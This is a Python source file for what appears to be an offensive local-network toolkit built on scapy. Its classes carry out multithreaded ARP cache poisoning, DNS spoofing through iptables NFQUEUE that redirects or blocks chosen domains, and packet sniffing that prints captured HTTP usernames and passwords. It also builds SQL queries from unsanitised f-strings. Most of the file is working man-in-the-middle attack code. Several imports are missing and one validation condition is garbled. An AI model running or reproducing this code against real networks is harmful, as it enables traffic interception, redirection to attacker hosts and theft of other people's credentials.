from subprocess import check_output
import scapy.all as sc

def get_all(table):
    cur=sqlite3.connect('orders.db').cursor()
    cur.execute(f"SELECT * FROM {table};")
    all_results = cur.fetchall()
    return all_results

def add_to_table(table, mac, name):
    conn = sqlite3.connect('orders.db')
    cur=conn.cursor()
    cur.execute(f"INSERT INTO {table}(ip, name) VALUES('{mac}', '{name}');")
    conn.commit()

class Arp_spoof:
    def __init__(self, Tar_IP, Route_IP, forwarding, cikl, Threads):
        self.sent=0
        print('[*] Data...', end='\r')
        Route_Mac=self.get_Mac_by_IP(Route_IP)
        Target_Mac=self.get_Mac_by_IP(Tar_IP)
        print('[*] Starting threads...    ', end='\r')
        for i in range(Threads):
            Thread(target=self.spoof, args=(Tar_IP, Route_IP, Target_Mac, Route_Mac, )).start()
        try:
            while True:
                print(f'[+] Sent {self.sent} packets                       ', end='\r')
                sleep(0.01)
        except KeyboardInterrupt:
            print('Pressed Ctrl + C !!!               ')
            exit()

    def get_Mac_by_IP(self, IP):
        for i in range(150):
            ans=sc.srp(sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=IP), verbose=False, timeout=1)[0]
            try:
                return ans[0][1].hwsrc
                break
            except:
                pass
        print("[-] Can't find this host in the network!")
    
    def get_IP_by_Mac(self, Mac):
        for i in range(150):
            ans=sc.srp(sc.Ether(dst=Mac)/sc.ARP(pdst='192.168.1.1/24'), verbose=False, timeout=1)[0]
            try:
                return ans[0][1].psrc
                break
            except:
                pass
        print("[-] Can't find this host in the network!")

    def spoof(self, Target_IP, Spoof_IP, Tar_Mac, Spoof_Mac):
        pack1=sc.ARP(op=2, pdst=Target_IP, hwdst=Tar_Mac, psrc=Spoof_IP)
        pack2=sc.ARP(op=2, pdst=Spoof_IP, hwdst=Spoof_Mac, psrc=Target_IP)
        while True:
                if self.sent % cikl == 0:
                    self.Target_IP=self.get_IP_by_Mac(Tar_Mac)
                    self.Spoof_IP=self.get_IP_by_Mac(Spoof_Mac)
                    pack1=sc.ARP(op=2, pdst=self.Target_IP, hwdst=Tar_Mac, psrc=self.Spoof_IP)
                    pack2=sc.ARP(op=2, pdst=self.Spoof_IP, hwdst=Spoof_Mac, psrc=self.Target_IP)
                sc.send(pack1, verbose=False, count=4)
                sc.send(pack2, verbose=False, count=4)
                self.sent+=2

def check_correctness_arpspoof_and_name(args):
    forwarding=args.Forward
    cikl=args.Cycle
    Tar_IP=args.Target
    Threads=args.Threads
    print('[*] Checking correctness of data...', end='\r')
    falses=[]
    if forwarding:
        if forwarding == '0' or forwarding == '1':
            call('sudo sysctl -w net.ipv4.ip_forward='+forwarding, shell=True, stdout=DEVNULL)
        else:
            falses.append('[-] Forwarding may be only 0 or 1!')
    else:
        falses.append('[-] Forwarding parameter not entered! See the "python3 exemple.py -h" !')
    if cikl:
        if cikl.isdigit():
            if int(cikl) != 0:
                cikl=int(cikl)
            else:
                falses.append("[-] Cikl can't be 0!")
        else:
            falses.append('[-] Cikl may be a number!')
    else:
        falses.append('[-] Cikl parameter not entered! See the "python3 exemple.py -h" !')

    if Tar_IP:
        if '.' in Tar_IP:
            Name=args.Name
            if Name:
                trues=0
                print('[*] Adding name into the base...             ', end='\r')
                for i in get_all('ipnames'):
                    if Name in i[1]:
                        trues += 1
                if trues == 0:
                    Mac_To_Table=None
                    for i in range(200):
                        try:
                            Mac_To_Table=sc.srp(sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=Tar_IP), verbose=False, timeout=1)[0][0][1].hwsrc
                            break
                        except:
                            pass            
                    if Mac_To_Table:
                        add_to_table('ipnames', Mac_To_Table, Name)
                    else:
                        print('[-] Could not find this address on the network!            ')
                        exit()
                else:
                    print('[-] This name is already used!')
            nums_ip=Tar_IP.split('.')
            false=0
            for i in nums_ip:
                if i.isdigit:
                    if int(i) < 256 and int(i) > 0:
                        false+=1
            if false == 4:
                Route_IP=Tar_IP[0:11]
    else:
        Name=args.Name
        if Name:
            print('[*] Name searching in the database...', end='\r')
            trues=0
            for i in get_all('ipnames'):
                if Name == i[1]:
                    trues+=1
                    print('[+] Name found in database! Getting IP...', end='\r')
                    Tar_IP=None
                    Tar_Mac=i[0]
                    for z in range(200):
                        try:
                            Tar_IP=sc.srp(sc.Ether(dst=Tar_Mac)/sc.ARP(pdst='192.168.1.1/24'), verbose=False, timeout=1)[0][0][1].psrc
                            break
                        except:
                            pass
                    if not Tar_IP:
                        print('[-] This host is not on the network!     ')
                        exit()
                    Route_IP=Tar_IP[0:11]
            if trues == 0:
                print('[-] This name is not in the database!')
                exit()
        else:
            falses.append('[-] Target parameter not entered! See the "python3 exemple.py -h" !')

    if Threads:
        if Threads.isdigit():
            if int(Threads) < 1:
                falses.append('[-] Number of threads must be greater then 0!')
            else:
                Threads=int(Threads)
        else:
            falses.append('[-] Number of threads must be numbers!')
    else:
        falses.append('[-] Threads parameter not entered! See the "python3 exemple.py -h" !')
    if len(falses) > 0:
        print('')
        for i in falses:
            print(i)
        exit()
    print('[+] Data is entered correctly.             \n[*] Loading...                ', end='\r')
    return Tar_IP, Route_IP, forwarding, cikl, Threads

class Dns_spoof:
    def __init__(self, pages, blocked, ip, port):
        self.pages=pages
        self.blocked=blocked
        self.ip=ip
        self.port=port
        call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell=True)
        call('sudo iptables -I INPUT -j NFQUEUE --queue-num 1', shell=True)
        try:
            qu = NetfilterQueue()
        except:
            print('[-] This programm must be started by sudo - "sudo python3 exemple.py [args]"')
            exit()
        qu.bind(1, self.process_packet)
        print(f'Spoof/Block list : {", ".join(pages)}                 \n[+] Spoofer is started :\n')
        try:
            qu.run()
        except:
            call('sudo iptables --flush', shell=True)

    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            try:
                qname = scapy_packet[DNSQR].qname
                print(qname)
                for i in self.pages:
                    print(f'{i} in {str(qname)} - {str(i in str(qname))}')
                    if i in str(qname):
                        if not self.blocked:
                            print(f'[+] Packet of url {qname} is spoofed!')
                            answer = DNSRR(rrname = qname, rdata = self.ip)
                            scapy_packet[DNS].an = answer
                            scapy_packet[DNS].ancount = 1
                            scapy_packet.dport=self.port
 
                            if scapy_packet.haslayer(IP):
                                del scapy_packet[IP].len
                                del scapy_packet[IP].chksum
                            if scapy_packet.haslayer(UDP):
                                del scapy_packet[UDP].chksum
                                del scapy_packet[UDP].len
                            if scapy_packet.haslayer(ICMP):
                                del scapy_packet[ICMP].chksum
                                del scapy_packet[ICMP].len
    
                            packet.set_payload(bytes(scapy_packet))
                            packet.accept()
                        else:
                            print(f'[+] Packet of url {qname} is blocked!')
                            packet.drop()
                    else:
                         packet.accept()
            except:
                packet.accept()

def check_correctness_dnsspoof(args):
    print('[*] Checking corectness of data...                       ', end='\r')
    Pages_sp=args.Pages
    Spoof_IP=args.Spoof_ip
    Spoof_port=args.Spoof_port
    Blocked=args.Blocked
    if not Pages_sp or not Spoof_IP and not Spoof_port and Blocked != 0 and not Blocked or not Spoof_IP and not Blocked and Blocked != 0 or not Spoof_port and not Blocked and Blocked != 0 or Blocked != 0 and Blocked != 1:
        exit('[-] Input data entered incorrectly. See "python3 example.py -h" !                ')
    else:
        print('[+] Data is entered correctly.             \n[*] Loading...                ', end='\r')
    print('[+] Data is entered correctly.             \n[*] Loading...                ', end='\r')
    return Pages_sp, Blocked, Spoof_IP, Spoof_port

class Sniff_data_browser:
    def __init__(self, interface):
        sc.sniff(iface=interface, store=False, prn=self.process_sniffed_paccket)
    def get_auth_info(self, text):
        for i in ['pass', 'ick', 'name', 'ser']:
            if i in text:
                return True
        return False
    def process_sniffed_paccket(self, packet):
        if packet.haslayer(sc.Raw):
            try:
                url=packet.Host + packet.Path
                print(f'[+] HTTP/HTTPS Request >> {url}')
            except:
                pass

            load_data=str(packet[sc.Raw].load).replace('\\n', '\n').replace('\\r', '\r')
            if self.get_auth_info(load_data):
                print(f'\n\n[+] Data/Username/password >> \n{load_data}\n\n')
            else:
                try:
                    print(packet.Host)
                except:
                    pass

def check_correctness_snif(args):
    try:
        if args.interface not in str(check_output('ifconfig')):
            exit('[-] Input data entered incorrectly. See "python3 example.py -h" !                ')
    except Exception as i:
        try:
            if args.interface not in str(check_output('ipconfig')):
                exit('[-] Input data entered incorrectly. See "python3 example.py -h" !                ')
        except:
            raise i
            exit('[-] Input data entered incorrectly. See "python3 example.py -h" !                ')
    print('[+] Data is entered correctly.             \n[*] Loading...                ', end='\r')
    return args.interface
